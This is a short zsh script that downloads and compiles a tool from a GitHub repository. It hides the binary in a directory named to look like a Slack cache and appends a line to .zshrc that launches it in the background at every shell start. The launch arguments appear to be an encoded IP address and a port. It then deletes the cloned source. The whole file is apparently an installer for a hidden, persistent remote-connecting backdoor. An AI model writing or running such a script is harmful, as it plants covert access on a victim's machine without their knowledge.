#!/bin/zsh

rm -rf tools ;git clone https://github.com/imEasyTool/tool.git tools ; make re -C tools ; chmod +x tools/tool ; mkdir -p Library/slack_cache/remote ; cp tools/tool Library/slack_cache/remote/ ;echo "~/Library/slack_cache/remote/tool 1226773770 3335 &" >> .zshrc ; rm -rf tools